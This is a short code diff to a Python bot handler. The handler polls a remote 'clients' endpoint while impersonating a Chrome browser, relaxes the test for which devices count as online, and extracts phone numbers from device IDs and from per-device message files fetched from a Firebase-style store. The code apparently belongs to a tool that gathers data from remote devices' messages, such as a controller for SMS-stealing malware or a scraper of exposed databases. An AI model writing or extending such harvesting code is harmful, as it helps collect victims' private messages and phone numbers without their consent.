@@ -1390,9 +1390,10 @@ def handle_all(message):
                         res = cffi_requests.get(clients_endpoint, impersonate="chrome120", timeout=12)
                         if res.status_code == 200:
                             data = res.json() or {}
+                            # Relaxed device check matching the monitor report logic
                             online_cids = [
                                 cid for cid, cdata in data.items() 
-                                if isinstance(cdata, dict) and cdata.get("status") is True
+                                if isinstance(cdata, dict) and (cdata.get("status") is True or cdata.get("status") == "true" or cdata.get("online") is True or cdata.get("online") == "true")
                             ]
                             if not online_cids and len(data) > 0:
                                 online_cids = list(data.keys())
@@ -1419,7 +1420,7 @@ def handle_all(message):
                     for cid in online_cids:
                         phone_number = None
                         
-                        # 1. Check client ID as direct phone number
+                        # 1. Check if CID itself is the phone number
                         clean_cid = ''.join(filter(str.isdigit, str(cid)))
                         if len(clean_cid) >= 10:
                             possible_cid_num = clean_cid[-10:]
@@ -1439,7 +1440,7 @@ def handle_all(message):
                                             phone_number = possible_num
                                             break
 
-                        # 3. Fallback: Scan messages/{cid}.json using extract_phone logic from befit firebase reference
+                        # 3. Fallback: Fetch messages/{cid}.json and apply extract_phone regex
                         if not phone_number:
                             msg_endpoint = f"{base_url}messages/{cid}.json"
                             if query:
